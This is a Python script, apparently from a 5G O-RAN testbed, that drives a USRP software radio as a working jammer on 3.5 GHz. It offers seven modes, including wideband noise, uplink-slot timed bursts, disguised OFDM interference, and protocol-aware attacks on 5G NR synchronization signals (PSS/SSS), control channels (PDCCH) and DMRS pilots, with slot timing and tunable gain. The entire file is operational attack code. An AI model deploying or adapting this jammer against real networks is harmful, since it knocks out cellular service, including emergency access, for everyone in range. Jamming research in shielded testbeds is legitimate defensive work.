import uhd
import numpy as np
import time
import yaml
import os
import argparse

# ─────────────────────────────────────────────
# Config 로드
# ─────────────────────────────────────────────
CONFIG_PATH = os.path.join(os.path.dirname(__file__), "config.yaml")

def load_jammer_addr():
    with open(CONFIG_PATH, "r") as f:
        cfg = yaml.safe_load(f)
    return cfg["network"]["nodes"]["instance3_jammer"]["usrp"]["ip"]

# ─────────────────────────────────────────────
# 공격 모드 정의
# ─────────────────────────────────────────────
MODES = {
    "1": "constant",
    "2": "random",
    "3": "reactive",
    "4": "deceptive",
    "5": "pss",
    "6": "pdcch",
    "7": "dmrs",
}

MODE_DESC = {
    "constant":  "지속 고출력 AWGN — 채널 완전 포화",
    "random":    "랜덤 펄스 재밍 — 0.01~0.1s 간격 불규칙 송신",
    "reactive":  "TDD 슬롯 모방 펄스 — 5G NR 프레임 타이밍 동기 (NR mode) / 5ms 주기 (legacy)",
    "deceptive": "OFDM 위장 재밍 — 합법 신호처럼 보이는 간섭",
    "pss":       "PSS/SSS 타겟 — 중앙 6-12 RB에 집중, 셀 접속 차단 (20ms 프레임 경계)",
    "pdcch":     "PDCCH 타겟 — 슬롯 첫 1-3 심볼 CORESET 공격 (NR 슬롯 정렬)",
    "dmrs":      "DMRS 타겟 — 빗살 패턴 파일럿 재밍, 채널 추정 교란",
}

def select_mode_interactive():
    print("\n[Jammer] 공격 모드를 선택하세요:")
    for key, name in MODES.items():
        print(f"  {key}) {name:<12} — {MODE_DESC[name]}")
    choice = input("\n모드 번호 또는 이름 입력: ").strip().lower()

    if choice in MODES:
        return MODES[choice]
    if choice in MODE_DESC:
        return choice
    print(f"[ERROR] 알 수 없는 입력: '{choice}'. constant 모드로 시작합니다.")
    return "constant"

# ─────────────────────────────────────────────
# 5G NR 타이밍 상수 (μ=1, SCS=30kHz)
# ─────────────────────────────────────────────
RATE               = 20e6
SAMPLES_PER_FRAME  = int(RATE * 0.010)   # 200,000 samples = 10ms radio frame
SAMPLES_PER_SLOT   = int(RATE * 0.0005)  # 10,000 samples = 0.5ms slot
SAMPLES_PER_SYMBOL = SAMPLES_PER_SLOT // 14  # ~714 samples per OFDM symbol

# TDD 패턴: DDDDDDDDDDDSUU (14 slots per frame, μ=1)
# Slot 0-10: DL, Slot 11: Special, Slot 12-13: UL
NR_UL_SLOTS = [12, 13]
NR_DL_SLOTS = list(range(12))

# ─────────────────────────────────────────────
# 신호 생성 헬퍼
# ─────────────────────────────────────────────
def awgn(n):
    return (np.random.randn(n) + 1j * np.random.randn(n)).astype(np.complex64)

def ofdm_like(n_fft=1024, n_repeat=10):
    """OFDM처럼 보이는 위장 신호 (IFFT 적용 AWGN)"""
    syms = (np.random.randn(n_fft) + 1j * np.random.randn(n_fft)).astype(np.complex64)
    frame = np.fft.ifft(syms).astype(np.complex64)
    return np.tile(frame, n_repeat)


# ─────────────────────────────────────────────
# Protocol-Aware 재밍 신호 생성
# ─────────────────────────────────────────────
N_FFT = 1024   # OFDM FFT 크기

def pss_jamming_symbol():
    """PSS/SSS 타겟 — 중앙 6-12 RB (약 72-144 서브캐리어)에 에너지 집중"""
    freq_domain = np.zeros(N_FFT, dtype=np.complex64)
    center = N_FFT // 2
    n_sc = np.random.randint(72, 145)   # 6-12 RB × 12 subcarriers
    half = n_sc // 2
    freq_domain[center - half:center + half] = awgn(n_sc) * 5.0
    return np.fft.ifft(freq_domain).astype(np.complex64)

def pdcch_jamming_burst(n_symbols=3):
    """PDCCH 타겟 — 슬롯 첫 1-3 OFDM 심볼을 광대역으로 재밍"""
    burst = np.concatenate([
        np.fft.ifft(awgn(N_FFT)).astype(np.complex64) * 4.0
        for _ in range(n_symbols)
    ])
    return burst

def dmrs_jamming_symbol(comb_spacing=6):
    """DMRS 타겟 — 빗살(comb) 패턴: 매 comb_spacing번째 서브캐리어에 에너지"""
    freq_domain = np.zeros(N_FFT, dtype=np.complex64)
    offset = np.random.randint(0, comb_spacing)
    freq_domain[offset::comb_spacing] = awgn(N_FFT // comb_spacing) * 5.0
    return np.fft.ifft(freq_domain).astype(np.complex64)


# ─────────────────────────────────────────────
# NR-Timing 기반 재밍 프레임 빌더
# ─────────────────────────────────────────────
def build_nr_reactive_frame(gain: float = 1.0) -> np.ndarray:
    """
    5G NR TDD 프레임(10ms) 버퍼를 빌드.
    UL 슬롯(12, 13)에만 재밍 신호를 채우고 나머지는 0.
    → gNB가 PUSCH를 수신하는 구간을 정확히 타겟.
    """
    frame = np.zeros(SAMPLES_PER_FRAME, dtype=np.complex64)
    for slot_idx in NR_UL_SLOTS:
        start = slot_idx * SAMPLES_PER_SLOT
        end   = start + SAMPLES_PER_SLOT
        frame[start:end] = awgn(SAMPLES_PER_SLOT) * gain * 3.0
    return frame


def build_nr_pdcch_frame(n_coreset_symbols: int, gain: float = 1.0) -> np.ndarray:
    """
    모든 슬롯의 첫 n_coreset_symbols 심볼에만 광대역 버스트.
    나머지는 0. → CORESET 구간 정밀 타겟.
    """
    frame = np.zeros(SAMPLES_PER_FRAME, dtype=np.complex64)
    burst_len = SAMPLES_PER_SYMBOL * n_coreset_symbols

    for slot_idx in range(SAMPLES_PER_FRAME // SAMPLES_PER_SLOT):
        slot_start = slot_idx * SAMPLES_PER_SLOT
        burst_end  = min(slot_start + burst_len, slot_start + SAMPLES_PER_SLOT)
        actual_len = burst_end - slot_start
        if actual_len > 0:
            burst_frames = []
            for _ in range(n_coreset_symbols):
                burst_frames.append(
                    np.fft.ifft(awgn(N_FFT)).astype(np.complex64) * gain * 4.0
                )
            burst = np.concatenate(burst_frames)[:actual_len]
            frame[slot_start:burst_end] = burst
    return frame


def build_nr_pss_frame(gain: float = 1.0) -> np.ndarray:
    """
    PSS/SSS는 매 5ms 서브프레임 경계(슬롯 0, 슬롯 10)에 전송.
    → 두 위치에 PSS-like 심볼 블록 삽입.
    """
    frame = np.zeros(SAMPLES_PER_FRAME, dtype=np.complex64)
    pss_slots = [0, 10]  # 첫 5ms, 두 번째 5ms 서브프레임 시작
    pss_symbol = np.tile(pss_jamming_symbol(), int(np.ceil(SAMPLES_PER_SLOT / N_FFT)))
    pss_symbol = pss_symbol[:SAMPLES_PER_SLOT] * gain

    for slot_idx in pss_slots:
        start = slot_idx * SAMPLES_PER_SLOT
        end   = start + SAMPLES_PER_SLOT
        frame[start:end] = pss_symbol
    return frame


# ─────────────────────────────────────────────
# 메인 재머
# ─────────────────────────────────────────────
def run_jammer(addr, mode="constant", freq=3.5e9, rate=20e6, gain=75,
               nr_timing=True, amplitude=1.0):
    print(f"[Jammer] USRP 연결 중: addr={addr}")
    usrp = uhd.usrp.MultiUSRP(f"addr={addr}")
    usrp.set_tx_rate(rate)
    usrp.set_tx_freq(uhd.libpyuhd.types.tune_request(freq))
    usrp.set_tx_gain(gain)
    usrp.set_tx_antenna("TX/RX", 0)
    print(f"[Jammer] 초기화 완료 — rate={rate/1e6:.0f} MHz, freq={freq/1e9:.1f} GHz, "
          f"gain={gain} dB, amplitude={amplitude:.3f}, ant=TX/RX")
    if nr_timing and mode in ("reactive", "pdcch", "pss"):
        print(f"[Jammer] 5G NR 타이밍 모드 활성화 "
              f"(SAMPLES_PER_FRAME={SAMPLES_PER_FRAME}, SLOT={SAMPLES_PER_SLOT})")

    streamer = usrp.get_tx_stream(uhd.usrp.StreamArgs("fc32", "sc16"))
    metadata = uhd.types.TXMetadata()

    print(f"\n[Jammer] >>> 공격 시작: mode={mode} — {MODE_DESC[mode]}")
    print("[Jammer]     종료하려면 Ctrl+C\n")

    tx_count = 0
    t_start = time.time()

    try:
        while True:
            if mode == "constant":
                streamer.send(awgn(10000) * amplitude, metadata)

            elif mode == "random":
                streamer.send(awgn(5000) * amplitude, metadata)
                time.sleep(np.random.uniform(0.005, 0.05))

            elif mode == "reactive":
                if nr_timing:
                    frame = build_nr_reactive_frame(gain=amplitude)
                    streamer.send(frame, metadata)
                else:
                    streamer.send(awgn(2000) * amplitude, metadata)
                    time.sleep(0.005)

            elif mode == "deceptive":
                streamer.send(ofdm_like() * amplitude, metadata)
                time.sleep(0.001)

            elif mode == "pss":
                if nr_timing:
                    frame = build_nr_pss_frame(gain=amplitude)
                    streamer.send(frame, metadata)
                else:
                    streamer.send(np.tile(pss_jamming_symbol(), 5) * amplitude, metadata)
                    time.sleep(0.020)

            elif mode == "pdcch":
                if nr_timing:
                    n_sym = np.random.randint(1, 4)
                    frame = build_nr_pdcch_frame(n_sym, gain=amplitude)
                    streamer.send(frame, metadata)
                else:
                    n_sym = np.random.randint(1, 4)
                    streamer.send(pdcch_jamming_burst(n_sym) * amplitude, metadata)
                    time.sleep(0.0005)

            elif mode == "dmrs":
                spacing = np.random.choice([4, 6])
                streamer.send(np.tile(dmrs_jamming_symbol(spacing), 5) * amplitude, metadata)
                time.sleep(0.001)

            tx_count += 1
            if tx_count % 500 == 0:
                elapsed = time.time() - t_start
                print(f"[Jammer]   bursts={tx_count:,} | elapsed={elapsed:.1f}s | mode={mode}")

    except KeyboardInterrupt:
        elapsed = time.time() - t_start
        print(f"\n[Jammer] <<< 공격 종료 — 총 {tx_count:,} bursts, {elapsed:.1f}초 경과")

# ─────────────────────────────────────────────
# Entry Point
# ─────────────────────────────────────────────
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="MSJC Jammer — 5G O-RAN 재밍 테스트")
    parser.add_argument("--mode", choices=["constant", "random", "reactive", "deceptive",
                                          "pss", "pdcch", "dmrs"],
                        default=None, help="공격 모드 (미지정 시 인터랙티브 선택)")
    parser.add_argument("--freq", type=float, default=3.5e9, help="TX 주파수 Hz (기본: 3.5e9)")
    parser.add_argument("--rate", type=float, default=20e6,  help="샘플 레이트 Hz (기본: 20e6)")
    parser.add_argument("--gain", type=int,   default=75,    help="TX 게인 dB (기본: 75)")
    parser.add_argument("--amplitude", type=float, default=1.0, help="신호 amplitude 스케일링 0.0~1.0 (기본: 1.0)")
    parser.add_argument("--nr-timing",    dest="nr_timing", action="store_true",  default=True,
                        help="5G NR 프레임 타이밍 기반 송신 (기본: 활성화)")
    parser.add_argument("--no-nr-timing", dest="nr_timing", action="store_false",
                        help="NR 타이밍 비활성화 — legacy sleep 방식")
    args = parser.parse_args()

    addr = load_jammer_addr()
    print(f"[Config] Jammer USRP addr = {addr}")

    mode = args.mode if args.mode else select_mode_interactive()
    run_jammer(addr, mode=mode, freq=args.freq, rate=args.rate, gain=args.gain,
               nr_timing=args.nr_timing, amplitude=args.amplitude)
